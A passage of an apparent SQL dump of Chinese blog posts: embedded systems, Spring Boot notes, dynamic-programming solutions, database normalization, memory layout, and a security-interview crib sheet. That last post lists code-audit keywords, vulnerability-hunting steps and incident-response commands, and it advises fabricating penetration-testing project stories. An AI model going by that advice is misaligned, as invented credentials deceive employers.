什么是嵌入式\n\n首先，我们来看看什么是嵌入式。\n\n嵌入式，一般是指嵌入式系统，英文叫作：embedded system。嵌入式开发，其实就是对嵌入式系统的开发。\n\nIEEE（美国电气和电子工程师协会）对嵌入式系统的定义是：“用于控制、监视或者辅助操作机器和设备的装置”。\n\n国内学术界的定义更为具体一些，也更容易理解：\n\n**嵌入式系统，是以应用为中心，以计算机技术为基础，软件硬件可裁剪，适用于对功能、可靠性、成本、体积、功耗有严格要求的专用计算机系统。**\n\n以应用为中心，说明嵌入式系统是有明确实际用途的。以计算机技术为基础，说明它其实就是一种特殊的计算机。软硬件可裁剪，说明它有很强的灵活性和可定制能力。\n\n专用计算机系统，“专用”所对应的，就是“通用”。我们常用的个人PC、笔记本电脑、数据中心服务器，可以用于多种用途，就是“通用计算机系统”。\n\n嵌入式系统究竟具体应用于哪些“专用”方向呢？\n\n举例如下：\n\n\n    个人通信与娱乐系统：手机、数码相机、音乐播放器、可穿戴电子产品、PSP游戏机\n\n    家电类产品：数字电视、扫地机器人、智能家电\n\n    办公自动化：打印机，复印机、传真机\n\n    医疗电子类产品：生化分析仪、血液分析仪、CT\n\n    网络通信类产品：通信类交换设备、网络设备 (交换机、路由器、网络安全)\n\n    汽车电子类产品：引擎控制、安全系统、汽车导航与娱乐系统\n\n    工业控制类产品：工控机、交互式终端 (POS、ATM)、安全监控、数据采集与传输、仪器仪表\n\n    军事及航天类产品：无人机、雷达、作战机器人\n![1](https://img-blog.csdnimg.cn/img_convert/532871c9aa7055838a3dc5e3603fc4d8.png)\n从硬件角度来看，嵌入式系统就是以处理器（CPU）为核心，依靠总线（Bus）进行连接的多模块系统：\n![2](https://img-blog.csdnimg.cn/img_convert/e573f2643ff5f1e2f456c13cb8a826b8.png)\n\n\n▉ 2.  什么是“单片机”？\n\n嵌入式系统的核心，就是嵌入式处理器。嵌入式处理器一般分为以下几种典型类型：\n\n- **嵌入式微控制器MCU（Micro Control Unit）**\n\nMCU内部集成ROM/RAM、总线逻辑、定时/计数器、看门狗、I/O、串口、A/D、D/A、FLASH等。典型代表是8051、8096、C8051F等。\n\n- **嵌入式DSP处理器（Digital Signal Processor）**\n\nDSP处理器专门用于信号处理，在系统结构和指令算法进行了特殊设计。在数字滤波、FFT、频谱分析中广泛应用。典型代表是TI（德州仪器）公司的TMS320C2000/C5000系列。\n\n- **嵌入式微处理器MPU（Micro Processor Unit）**\n\nMPU由通用处理器演变而来，具有较高的性能，拥有丰富的外围部件接口。典型代表是AM186/88、386EX、SC-400、PowerPC、MIPS、ARM系列等。\n\n此外，还有**嵌入式片上系统SoC**（System on Chip）和**可编程片上系统SoPC**（System on a Programmable Chip）。\n\n我们的单片机，就属于上述的第一种——MCU（嵌入式微控制器）。\n![34](https://img-blog.csdnimg.cn/img_convert/6a3edfe21b3ef5efeb09b49ae0d2902b.png)',1,1,5,'2022-09-21 22:29:13',1,0,0),(8,'Springboot踩坑记录','\n\n# Redis相关\n\n**启动** sudo redis-server /etc/redis/redis.conf\n\n**终止** \n\n1.登陆后 shutdown save\n2.service redis-server stop\n\n**操作** redis-cli -p 6379 --raw\n\n> 查看List `lrange ListName 0 -1`\n> 查看key  `keys * `\n> 查看value `get KeyName`\n\n<br/>\n\n# Springboot 注解\n\n`@ConfigurationProperties(prefix = \"xxx\")` \n\n告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；\n prefix = \"xxx\"：注解，其中prefix 指定配置文件里的前缀\n\n<br/>\n\n# Spring Boot Configuration Annotation Processor not configured 问题解决\n\n**原因**\n\nSpring Boot配置注解执行器没有配置：配置注解执行器配置完成后，当执行类中已经定义了对象和该对象的字段后，在配置文件中对该类赋值时，便会非常方便的弹出提示信息\n\n**解决**\n\n```xml\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-configuration-processor</artifactId>\n        <optional>true</optional>\n    </dependency>\n```\n\n<br/>\n\n# 微服务案例\n\n> https://www.yuque.com/gavincoder/sryby9/ea81wa\n>\n> https://mp.weixin.qq.com/s?__biz=MzU4Njg0MzYwNw==&mid=2247484173&idx=1&sn=0adceb6d5261aa1d59908043ff690423&chksm=fdf457b5ca83dea3203e5901771ba1cb49ce05db5b700c21536111f2e251373a484da123f0c2&token=1855594949&lang=zh_CN#rd\n>\n> 部署： https://blog.csdn.net/qq_33619378/article/details/100130292\n\n<br/>\n\n# Jwt/ Spring Security\n\n> https://www.pianshen.com/article/9827187857/\n>\n> https://mp.weixin.qq.com/s/lpznrVx6Bh9X7ZnunrWQSA?\n>\n> **Mall项目实例**  http://www.macrozheng.com/#/architect/mall_arch_04\n\n<br/>\n\n# 跨域问题\n\n**1.Springboot**\n\n> https://blog.csdn.net/zwq56693/article/details/109392721\n\n**2.Springcloud gateway**\n\n> https://blog.csdn.net/lynn349x/article/details/100924025?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control#commentBox\n\n\n\n# Authentication\n\n对Spring Security的Authentication模块进行一个初步的概念了解，知道它是如何进行用户认证的\n\n考虑一个比较熟悉的标准认证过程：\n\n```textile\n1. 用户使用username和password登录\n2. 系统验证这个password对于该username是正确的\n3. 假设第二步验证成功，获取该用户的上下文信息（如他的角色列表）\n4. 围绕该用户建立安全上下文（security context）\n5. 用户可能继续进行的一些操作被一个验证控制机制潜在的管理，这个验证机制会根据当前用户的安全上下文来验证权限\n```\n\n认证过程就是又前三项构成的。在Spring Security中是这样处理这三部分的：\n\n```textile\n1. username和password被获得后封装到一个UsernamePasswordAuthenticationToken（Authentication接口的实例）的实例中\n2. 这个token被传递给AuthenticationManager进行验证\n3. 成功认证后AuthenticationManager将返回一个得到完整填充的Authentication实例\n4. 通过调用SecurityContextHolder.getContext().setAuthentication(...)，参数传递authentication对象，来建立安全上下文（security context）\n```\n\n',0,1,4,'2022-09-21 22:31:13',1,0,1),(9,'动态规划题目总结','# 动态规划\n\n## 子序列问题\n\n[最长递增子序列](https://leetcode.cn/problems/longest-increasing-subsequence/)：返回一维数组的最长递增子序列的长度\n\n```c++\nint lengthOfLIS(vector<int>& nums) {\n    int n=nums.size(), ans = 1;\n    vector<int> dp(n,1);\n    for(int i=0;i<n;++i){\n        for(int j=0;j<i;++j){\n            if(nums[j]<nums[i])\n                dp[i] = max(dp[i],dp[j]+1);\n        }\n        ans = max(ans,dp[i]);\n    }\n    return ans;\n}\n```\n\n\n[1143. 最长公共子序列](https://leetcode.cn/problems/longest-common-subsequence/)：返回两个字符串的最长公共序列（顺序一致，不必连续）\n\n> [583. 两个字符串的删除操作](https://leetcode.cn/problems/delete-operation-for-two-strings/)：求出最长公共序列后，相减则得出删几个字符使两者相同\n\n```c++\nint longestCommonSubsequence(string text1, string text2) {\n    const int n1=text1.size(),n2=text2.size();\n    vector<vector<int>> dp(n1+1,vector<int>(n2+1,0)); //防止讨论i-1<0情况\n    for(int i=1;i<=n1;++i)\n        for(int j=1;j<=n2;++j){\n            if(text1[i-1] == text2[j-1])\n                dp[i][j] = dp[i-1][j-1]+1;\n            else\n                dp[i][j] = max(dp[i-1][j],dp[i][j-1]);\n        }\n    return dp[n1][n2];\n}\n```\n\n## 背包问题\n\n### 0-1背包—物品只能选一次\n\n状态转移式：`dp[i][j] = max(dp[i-1][j], dp[i-1][j-w] + v);`\n\n```c++\nint knapsack(vector<int> weights, vector<int> values, int N, int W) {\n    vector<vector<int>> dp(N + 1, vector<int>(W + 1, 0));\n    for (int i = 1; i <= N; ++i) {\n        int w = weights[i-1], v = values[i-1];\n        for (int j = 1; j <= W; ++j)\n            if (j >= w)\n                dp[i][j] = max(dp[i-1][j], dp[i-1][j-w] + v);\n            else\n                dp[i][j] = dp[i-1][j];\n    }\n    return dp[N][W];\n}\n// 空间压缩后\nint knapsack(vector<int> weights, vector<int> values, int N, int W) {\n    vector<int> dp(W + 1, 0);\n    for (int i = 1; i <= N; ++i) {\n        int w = weights[i-1], v = values[i-1];\n        for (int j = W; j >= w; --j)\n        	dp[j] = max(dp[j], dp[j-w] + v);\n    }\n    return dp[W];\n}\n```\n\n\n### 完全背包—物品选无限次\n\n状态转移式：`dp[i][j] = max(dp[i-1][j], dp[i][j-w] + v);`\n\n```c++\nint knapsack(vector<int> weights, vector<int> values, int N, int W) {\n    vector<vector<int>> dp(N + 1, vector<int>(W + 1, 0));\n    for (int i = 1; i <= N; ++i) {\n        int w = weights[i-1], v = values[i-1];\n        for (int j = 1; j <= W; ++j)\n            if (j >= w)\n            	dp[i][j] = max(dp[i-1][j], dp[i][j-w] + v);\n            else\n            	dp[i][j] = dp[i-1][j];\n    }\n    return dp[N][W];\n}\n```\n\n## 字符串编辑\n\n[编辑距离](https://leetcode.cn/problems/edit-distance/)：求将 `word1` 转换成 `word2` 所使用的最少操作数，可以任意位置删除、替换、插入\n\n题解：\n\n- 定义`dp[i][j]`为使两单词前`i j`部分相同的最少操作数\n- 状态转移方程\n  - 若`word1[i]=word2[j]`：`dp[i][j]=dp[i-1][j-1]`\n  - 若`word1[i]≠word2[j]`：\n    - 在`i`后插入/`j`处删除：`dp[i][j]=dp[i][j-1]+1`\n    - 在`j`后插入/`i`处删除：`dp[i][j]=dp[i-1][j]+1`\n    - 在`i`/`j`处修改：`dp[i][j]=dp[i-1][j-1]+1`\n- 考虑初值`i=0`或`j=0`的情况：`i=0`时，word1为空，只能删除/插入`j`次；`j=0`时同理\n  - `dp[0][j]=j, dp[i][0]=i`\n\n\n\n## 股票问题\n\n[买卖股票的最佳时机 IV](https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iv/)：给定price[i]共可交易k次，求最大利润\n\n1.状态定义：\n\n   - `dp[i][j][0]`表示第`i`天共交易`j`次且当前不持有股票，跟在`dp[i-1][j][1]`之后（买卖为一次交易）\n\n   - `dp[i][j][1]`表示第`i`天共交易`j`次且当前不持有股票，跟在`dp[i-1][j-1][0]`之后\n\n2.状态转移\n\n   - `dp[i][j][0] = max{ dp[i-1][j][0],dp[i-1][j][1]+price[i] }`\n   - `dp[i][j][1] = max{ dp[i-1][j][1],dp[i-1][j-1][0]-price[i] }`\n\n3.初始化\n\n   - `dp[0][0][0]=0`：第一天没交易过没股票\n   - `dp[0][1][1]=-price[0]`：第一天第一次交易买了股票\n   - 其他均不合法情况，设置为`INI_MIN`\n\n4.执行结果\n\n   - 最后一天、不持有股票、交易0～k次中的最大值，即`max{dp[n-1][i][0]}, 0<=i<=k`\n\n5.代码\n\n   ```c++\n   int maxProfit(int k, vector<int>& prices) {\n       int n = prices.size(),ans = 0;;\n       k = min(k,n/2);\n       if(!k || !n) return 0;\n       vector<vector<int>> tmp(k+1,vector<int>(2));\n       vector<vector<vector<int>>> dp(n,tmp);\n   \n       for(int i=0;i<=k;++i) \n           dp[0][i][0]=dp[0][i][1]=INT_MIN/2;\n       dp[0][0][0]=0;\n       dp[0][1][1]=-prices[0];\n   \n       for(int i=1;i<n;++i){\n           for(int j=1;j<=k;++j){\n               dp[i][j][0]=max(dp[i-1][j][0],dp[i-1][j][1]+prices[i]);\n               dp[i][j][1]=max(dp[i-1][j][1],dp[i-1][j-1][0]-prices[i]);\n           }\n       }\n       for(int i=1;i<=k;++i)\n           if(ans<dp[n-1][i][0]) \n               ans=dp[n-1][i][0];\n       return ans;\n   }\n   ```\n\n> 以下几种情况均不强调制定交易次数，可省略`k`维度\n\n[买卖股票的最佳时机](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/)：限定交易次数 k=1\n\n```c++\ndp[i][0] = max(dp[i-1][0], dp[i-1][1]+prices[i])\n//k=0时没有交易次数，dp[i-1][0][0]必为0\ndp[i][1] = max(dp[i-1][1], -prices[i])\n```\n\n[买卖股票的最佳时机 II](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/)：交易次数无限制 k = +infinity\n\n```c++\ndp[i][0] = max(dp[i-1][0], dp[i-1][1]+prices[i])\n//前一天持有不操作 和 前一天不持有然后买入\ndp[i][1] = max(dp[i-1][1], dp[i-1][0]-prices[i])\n```\n\n[最佳买卖股票时机含冷冻期](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/)：卖出后至少隔1天才能买\n\n```c++\ndp[i][0] = max(dp[i-1][0], dp[i-1][1]+prices[i])\n//冷却时间1天，所以要从 i-2 天转移状态\ndp[i][1] = max(dp[i-1][1], dp[i-2][0]-prices[i])\n```\n\n[买卖股票的最佳时机含手续费](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/)：每次交易含手续费\n\n```c++\n//定义在卖出的时候扣手续费\ndp[i][0] = max(dp[i-1][0], dp[i-1][1]+prices[i]-fee)\ndp[i][1] = max(dp[i-1][1], dp[i-1][0]-prices[i])\n```\n\n',1,1,2,'2022-09-21 22:34:11',1,0,0),(10,'规范化理论','# 问题的提出\n\n1.一个关系模式是一个五元组，形如R(U,D,DOM,F)。其中D、DOM与模式设计关系不大，可以看作三元组R<U,F>。\n\n- 关系名R是符号化的元组定义；\n- U为一组属性；\n- D为属性组U中的属性所来自的域；\n- DOM为属性到域的映射；\n- F为属性组U上的一组数据依赖。\n\n2. 数据依赖：一个关系内部属性与属性之间的一种约束关系。最重要的是**函数依赖（FD）**和**多值依赖（MVD）**，还有一个叫连接依赖。\n\n3.分析关系模式常见问题：\n\n- 数据冗余：重复出现，浪费空间。（尽可能少）\n- 更新异常：更新代价（最好没有）\n- 插入异常：插入部分信息时无法插入（最好没有）\n- 删除异常：可能删除了其他想要的数据（最好没有）\n\n------\n\n\n\n# 规范化\n\n## 函数依赖\n\n1.函数依赖：（概念省略，X、Y是属性组U的子集）X函数确定Y或Y函数依赖于X，记作X→Y。例如：系号→系名，学号→姓名。\n\n　　（1）函数依赖不是指关系模式R中的某些关系满足的约束条件，而是指R上的一切关系都要满足的约束条件。函数依赖关系的存在与时间无关，而只与数据之间的语义规定有关。\n\n　　（2）函数依赖的基本性质：扩张性，投影性，合并性，分解性，\n\n2.非平凡的函数依赖X→Y：X→Y，但Y不包含于X。默认我们讨论的都是非平凡的函数依赖。\n\n3.平凡的函数依赖X→Y：X→Y，但Y包含于X。必然成立（好像是废话）。\n\n4.若X→Y，则称X为这个函数依赖的决定属性组，也称决定因素，Y为依赖因素。\n\n------\n\n5.**完全函数依赖**：在R（U）中，如果X → Y，并且对于X的任何一个真子集X’，都有X’ /→ Y，则称Y对X完全函数依赖。记作X F→ Y。\n\n　　推论：单一决定因素一定是完全函数依赖。\n\n　　例：（学号，课程号）→成绩\n\n6.**部分函数依赖**：在R（U）中，如果X→Y，且Y不完全函数依赖于X，则称Y对X部分函数依赖。记作X P→ Y。\n\n　　例：（学号，课程号）→课程名　　（因为课程号→课程名，而课程号是（学号，课程号）的真子集）\n\n7.**传递函数依赖**：在R（U）中，如果X→Y（Y不包含于X），Y /→ X，Y→Z（Z不包含于Y），则称Z对X传递函数依赖。记为X 传递（t）→ Z。\n\n　　注：条件中要有Y /→ X，是因为如果Y→ X，则Y←→ X，则X直接→ Z，属于直接函数依赖，而非间接。\n\n　　例：系号→系名，系名→系主任名。\n\n------\n\n\n\n## 键与码\n\n> 键字=码字，所以 主键=主码=主关键字，候选键=候选码=候选关键字\n> https://blog.csdn.net/sumaliqinghua/article/details/85872446#commentBox\n\n![](https://cdn.jsdelivr.net/gh/Yveltals/Picgo/键与码.png)\n\n1.**码/超键/超码**：能够**唯一标识**一条记录的属性或属性集\n\n2.**候选码/键**：去掉超码中多余的属性，能够**唯一标识**一条记录的**最小属性集**\n\n3.**主码/键**： 选其中**一个候选码**作为主码\n\n4.**全码**： 最极端的情况，整个属性组U是码，称为全码\n\n5.**外码/键**： 关系模式R中的属性或属性组X不是R的码，但X是另一个关系模式的码，则称X为R的外部码（外码）\n\n6.**主属性**  包含在任一候选码中的属性称主属性。简单来说，主属性是**候选码所有属性的并集**\n\n​	**非主属性**  不包含在候选码中的属性称为非主属性。 非主属性是相对于主属性来定义的\n\n------\n\n\n\n## 范式\n\n12.**第一范式（1NF）**：每一个分量必须是不可分的数据项（关系中每个属性都是不可再分的简单项）。\n\n13.**第二范式（2NF）**：若R满足第一范式，且每一个非主属性**完全函数依赖**于任何一个候选码。\n\n　　推论：候选码为单属性或者全码，则属于2NF\n\n　　特点：不存在非主属性对候选码的部分函数依赖。\n\n　　1NF→2NF：消除非主属性对候选码的部分函数依赖，把部分函数依赖投影出来单独成表。（一事一表）\n\n14.**第三范式（3NF）**：若R满足第二范式，且它的每一个非主属性都**不传递依赖**于任何候选码。\n\n　　定义：关系模式R<U，F>属于第一范式，若R中不存在这样的码X，属性组Y及非主属性Z（Y不包含于Z）使得X→Y，Y→Z成立，Y/→X，则称R属于3NF。\n\n　　定义理解：3NF的定义由1NF推过来的，不太好理解，判定的话用上上行2NF推导过来的就可以了，这个定义同时也可以证明，若R属于3NF，则R必属于2NF。\n\n　　特点：每一个非主属性对候选码没有部分函数依赖，也没有传递函数依赖。\n\n　　缺点：3NF只限制了非主属性对键的依赖关系，而没有限制主属性对键的依赖。\n\n　　2NF→3NF：消除非主属性对键的传递函数依赖，把传递依赖投影出来单独成表。（一事一表）\n\n15.**BCNF**：关系模式R<U,F>中，每一个决定因素都包含R的一个码（候选键），则R属于BCNF。\n\n　　定义：关系模式R<U，F>属于第一范式，若X→Y（Y不包含于X）时X必含有码，则R属于BCNF。\n\n　　特点：排除任何属性对候选码的传递函数依赖和部分函数依赖。在函数依赖范畴内实现彻底分离，消除插入和删除异常。\n\n　　3NF→BCNF：消除原关系中主属性对键的部分函数依赖和传递函数依赖。\n\n　　推论：如果R属于BCNF，则\n\n- R中所有非主属性对每一个码都是完全函数依赖；\n- R中所有主属性对每一个不包含它的码，都是完全函数依赖；\n- R中没有任何属性完全函数依赖于非码的任何一组属性。\n\n　　定理：如果R属于BCNF，则R属于3NF一定成立。反之不一定成立，因为3NF的不彻底性（可能存在主属性对码的部分依赖和传递依赖）。\n\n　　例：（S，J）→T，（S，T）→J，T→J。候选码为（S，J）、（S，T），T是决定因素，但T不包含码。\n\n16.**BCNF分解算法**\n\n(1) BC分解算法如下所述:\n\n1. 如果R满足BCNF 不必操作\n2. 如果FD： X->Y违例( X不是R_i的超码 )，则计算{X}+， x的闭包也就是X能决定什么\n3. 拆分，将{X}+作为一个关系R1，X与剩下部分作为另一个集合R2\n4. 对R1，R2做前三部的递归。\n\n(2) **例题**：存在关系R(A, B, C, D, E)，满足 (A, B) -> E, (C, D) -> E, A -> C, C -> A分解为BCNF\n\n| relation  | candidate key | satisfied BCNF?      |\n| --------- | ------------- | -------------------- |\n| R = ABCDE | ABD/BCD       | N (AB->E  VIOLATING) |\n| R1 = ABE  | AB            | Y                    |\n| R2 = ABCD | ABD/BCD       | N (A->C  VIOLATING)  |\n| R21 = AC  | A             | Y                    |\n| R22 = ABD | ABD           | Y                    |\n\n> Result:  ABE AC ABD\n\n\n\n17.一个低一级范式的关系模式可以通过**模式分解**转换为若干个高一级范式的关系模式集合，这个过程叫做**规范化**。\n\n \n\n1.**无损连接性**：对分解后的新关系进行自然连接得到的元组的集合与原关系完全一致,则称为无损连接。\n\n2.**函数依赖保持性**： 简单来说，如果F上的每一个函数依赖都在其分解后的某一个关系上成立，则这个分解是保持函数依赖的（注意：这是一个充分条件）。\n\n3.规范化过程既要具有无损连接性，又要具有函数依赖保持性。前者可以保证不丢失信息，后者可以减轻或解决各种异常情况。\n\n4.非规范化技术：有时候可以适当降低甚至抛弃关系模式的范式，提高数据库运行效率。比如经常从两个表中查询数据，为了避免频繁连接，可以适当数据冗余。\n\n（1）表分割：水平分割，垂直分割。\n\n（2）非规范化设计的主要优点\n\n- 减少了查询操作所需的连接\n- 减少了外部键和索引的数量\n- 可以预先进行统计计算，提高了查询时的响应速度\n\n（3）非规范化存在的主要问题\n\n- 增加了数据冗余\n- 影响数据库的完整性\n- 降低了数据更新的速度\n- 增加了存储表所占用的物理空间\n\n5.闭包概念\n\n- 属性集的闭包：给定关系R(U,F), 对F，F+中所有X→A的A的集合称为X的闭包，记为X+。\n- 函数依赖的闭包： 若F为关系模式R(U)的函数依赖集，我们把F以及所有被F逻辑蕴涵的函数依赖的集合称为F的闭包，记为F+。\n\n　　　　规定：若X为U的子集，X→Φ 属于F+。\n\n属性集闭包的用途：\n\n- 判断α是否为超码，通过计算α+（α在F下的闭包），看α+ 是否包含了R中的所有属性。若是，则α为R的超码。\n- 通过检验是否β∈α+，来验证函数依赖是否成立。也就是说，用属性闭包计算α+，看它是否包含β。',0,0,0,'2022-09-21 22:35:26',1,0,2),(11,'内存结构','\n\n\n# 虚拟内存与物理内存\n\n操作系统有虚拟内存与物理内存的概念。在很久以前，还没有虚拟内存概念的时候，程序寻址用的都是物理地址。程序能寻址的范围是有限的，这取决于CPU的地址线条数。比如在32位平台下，寻址的范围是2^32也就是4G。并且这是固定的，如果没有虚拟内存，且每次开启一个进程都给4G的物理内存，就可能会出现很多问题：\n\n- 因为我的物理内存时有限的，当有多个进程要执行的时候，都要给4G内存，很显然你内存小一点，这很快就分配完了，于是没有得到分配资源的进程就只能等待。当一个进程执行完了以后，再将等待的进程装入内存。这种频繁的装入内存的操作是很没效率的\n- 由于指令都是直接访问物理内存的，那么我这个进程就可以修改其他进程的数据，甚至会修改内核地址空间的数据，这是我们不想看到的\n- 因为内存时随机分配的，所以程序运行的地址也是不正确的。\n\n于是针对上面会出现的各种问题，虚拟内存就出来了。\n\n一个进程运行时都会得到4G的虚拟内存。这个虚拟内存你可以认为，每个进程都认为自己拥有4G的空间，这只是每个进程认为的，但是实际上，在虚拟内存对应的物理内存上，可能只对应的一点点的物理内存，实际用了多少内存，就会对应多少物理内存。\n\n进程得到的这4G虚拟内存是一个**连续的地址空间（这也只是进程认为），而实际上，它通常是被分隔成多个物理内存碎片，还有一部分存储在外部磁盘存储器上，在需要时进行数据交换。**\n\n进程开始要访问一个地址，它可能会经历下面的过程\n\n1. 每次我要访问地址空间上的某一个地址，都需要把地址翻译为实际物理内存地址\n2. 所有进程共享这整一块物理内存，每个进程只把自己目前需要的虚拟地址空间映射到物理内存上\n3. 进程需要知道哪些地址空间上的数据在物理内存上，哪些不在（可能这部分存储在磁盘上），还有在物理内存上的哪里，这就需要通过页表来记录\n4. 页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）\n5. 当进程访问某个虚拟地址的时候，就会先去看页表，如果发现对应的数据不在物理内存上，就会发生缺页异常\n6. 缺页异常的处理过程，操作系统立即阻塞该进程，并将硬盘里对应的页换入内存，然后使该进程就绪，如果内存已经满了，没有空地方了，那就找一个页覆盖，至于具体覆盖的哪个页，就需要看操作系统的页面置换算法是怎么设计的了。\n\n \n\n关于虚拟内存与物理内存的联系，下面这张图可以帮助我们巩固。\n\n![](https://cdn.jsdelivr.net/gh/Yveltals/Picgo/共享内存2.png)\n\n\n\n## 页表的工作原理如下图\n\n![](https://cdn.jsdelivr.net/gh/Yveltals/Picgo/内存结构2.png)\n\n1. 我们的cpu想访问虚拟地址所在的虚拟页(VP3)，根据页表，找出页表中第三条的值.判断有效位。 如果有效位为1，DRMA缓存命中，根据物理页号，找到物理页当中的内容，返回\n2. 若有效位为0，参数缺页异常，调用内核缺页异常处理程序。内核通过页面置换算法选择一个页面作为被覆盖的页面，将该页的内容刷新到磁盘空间当中。然后把VP3映射的磁盘文件缓存到该物理页上面。然后页表中第三条，有效位变成1，第二部分存储上了可以对应物理内存页的地址的内容\n3. 缺页异常处理完毕后，返回中断前的指令，重新执行，此时缓存命中，执行1\n4. 将找到的内容映射到告诉缓存当中，CPU从告诉缓存中获取该值，结束\n\n \n\n## 再来总结一下虚拟内存是怎么工作的\n\n当每个进程创建的时候，内核会为进程分配4G的虚拟内存，当进程还没有开始运行时，这只是一个内存布局。实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text  .data段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的映射就好（叫做存储器映射）。这个时候数据和代码还是在磁盘上的。当运行到对应的程序时，进程去寻找页表，发现页表中地址没有存放在物理内存上，而是在磁盘上，于是发生缺页异常，于是将磁盘上的数据拷贝到物理内存中。\n\n另外在进程运行过程中，要通过malloc来动态分配内存时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。\n\n可以认为虚拟空间都被映射到了磁盘空间中（事实上也是按需要映射到磁盘空间上，通过mmap，mmap是用来建立虚拟空间和磁盘空间的映射关系的）\n\n \n\n## 利用虚拟内存机制的优点 \n\n1. 既然每个进程的内存空间都是一致而且固定的（32位平台下都是4G），所以链接器在链接可执行文件时，可以设定内存地址，而不用去管这些数据最终实际内存地址，这交给内核来完成映射关系\n2. 当不同的进程使用同一段代码时，比如库文件的代码，在物理内存中可以只存储一份这样的代码，不同进程只要将自己的虚拟内存映射过去就好了，这样可以节省物理内存\n3. 在程序需要分配连续空间的时候，只需要在虚拟内存分配连续空间，而不需要物理内存时连续的，实际上，往往物理内存都是断断续续的内存碎片。这样就可以有效地利用我们的物理内存\n\n<br/><br/>\n\n# C语言内存模型\n\n## 内核空间和用户空间\n\n对于32位环境，理论上程序可以拥有 4GB 的虚拟地址空间，我们在C语言中使用到的变量、函数、字符串等都会对应内存中的一块区域。\n\n但是，在这 4GB 的地址空间中，要拿出一部分给操作系统内核使用，应用程序无法直接访问这一段内存，这一部分内存地址被称为`内核空间`（Kernel Space）。\n\nLinux 将高地址的 1GB 空间分配给内核，应用程序只能使用剩下的3GB 空间，称为`用户空间`（User Space）。\n\n## Linux下32位环境的用户空间内存分布情况\n\n我们暂时不关心内核空间的内存分布情况，下图是Linux下32位环境的一种经典内存模型：\n\n![](https://cdn.jsdelivr.net/gh/Yveltals/Picgo/内存结构_详.jpg)\n\n\n\n对各个内存分区的说明：\n\n| 内存分区                 | 说明                                                         |\n| ------------------------ | ------------------------------------------------------------ |\n| 程序代码区 (code)        | 存放函数体的二进制代码                                       |\n| 常量区 (constant)        | 存放一般的常量、字符串常量等，这块内存只有读取权限，没有写入权限 |\n| 全局数据区 (global data) | 存放全局变量、静态变量等，这块内存有读写权限                 |\n| 堆区 (heap)              | 一般由程序员分配和释放，若程序员不释放，程序运行结束时由操作系统回收。malloc()、calloc()、free() 等函数操作的就是这块内存 |\n| 动态链接库               | 用于在程序运行期间加载和卸载动态链接库                       |\n| 栈区 (stack)             | 存放函数的参数值、局部变量的值等，其操作方式类似于数据结构中的栈 |\n\n> 常量区和全局数据区有时也被合称为静态数据区，意思是这段内存专门用来保存数据，在程序运行期间一直存在。\n\n- `常量区`、`全局数据区`、`栈`上的内存由系统自动分配和释放，不能由程序员控制。\n- `堆`由程序员控制：它是一块巨大的内存空间，程序可以申请一块内存，并自由地使用。堆内存在程序主动释放之前会一直存在，不随函数的结束而失效。在函数内部产生的数据只要放到堆中，就可以在函数外部使用。',0,0,1,'2022-09-21 22:36:20',1,0,0),(12,'网络安全面试必问','# 项目经历\n因为大家写的都是渗透相关，所以编故事也要编的圆润些，题材可以去[freebuf](https://search.freebuf.com/search/?search=%E6%8C%96%E6%B4%9E#article)\n\n这里主要记录如何挖洞的，实际项目也可以百度一下  看看别人故事咋编的\n\n---\n\n# 你平时是怎么挖漏洞的？\n## 白盒测试：\n1.就去找一些敏感文件和可能存在漏洞的关键函数什么的，有一个专门的代码审计手册，按照上面操作就行。\n\n2.比如说：很多人不注意的那个install文件，安装完成后不删除，会进行二次安装，还有一些sql注入的关键词：select、$_GET、$_POST、gbk啥的\n\n3.文件上传的关键词，$_FILES，csrf：token、reffer头、命令执行：shell_exec、system 文件包含：include、文件下载：file_get_contents、fopen、xss：echo、var_dump\n\n4.使用工具+人工方式进行挖掘\n## 黑盒的话：\n1.以我的经验来看，只要是有输入的地方，就有可能存在漏洞，尤其是登录注册那块，是否存在暴力破解、sql注入、xss、不安全的验证码啥的\n\n2.第一步肯定是要进行信息收集，收集尽可能多的信息，方便挖掘漏洞，你可以使用谷歌、百度等搜索引擎，搜集敏感信息，尤其是robots.txt文件\n\n3.也可以借助工具去搜集信息，指纹识别工具，目录扫描工具去扫描，如果扫描出它是拿开源软件写的话，就可以去搜索对应的漏洞\n\n4.也可以用工具去扫描他开放了哪些端口、尤其是那些危险端口\n\n5.还有就是看它的文件上传的地方，是否存在文件上传漏洞，文件下载的地方，是否存在敏感信息泄露，个人中心是否存在逻辑漏洞，还有那些交易的页面，购物车页面测试是否存在逻辑漏洞\n\n6.一般来说的话，我会采用工具+人工的方式进行漏洞挖掘，漏洞最多的话还是弱口令、sql注入、反序列化、任意读取等\n\n---\n\n# 应急这块了解吗：\n## linux中毒\n按照他们的说法是第一步先来个断网，主要还是看用户啊，密码文件是否有多余账户，用whoami看当前的用户权限，top查看负载啊、资源占比情况，awk等命令过滤，用ps看下有哪些危险的进程，用chkconfig --list看下有没有可疑的服务，还有用crontab查看它有没有可疑的定时任务等，用history查看操作工哪些命令，netstat -antlp查看危险端口，runlevel 查看允许级别，cat /var/log/sevure 查看安全日志，有web站点的话，就用D盾、河马查杀等工具或者手工对关键函数、脚本木马关键词进行查杀\n## windows\n查看有没有可疑的账号，服务器是否存在弱口令，用命令打开操作系统日志，查看管理员登录时间、用户名是否异常等等，再一个就是检查端口和进程，也是使用命令netstat -ano 查看端口连接状态，根据那个PID定位到进程，进行查杀，同样有web站点的话，我们可以使用D盾、火绒剑等工具进行查杀，主要是看那些危险进程，有没有签名、可疑的描述信息啥的，再一个就是检查它的服务、启动项、计划任务等，看它的安全日志里是不是有可疑操作，还有就是看他的操作系统是不是打了补丁，工具的话，可以使用360、卡巴斯基查杀病毒木马\n## 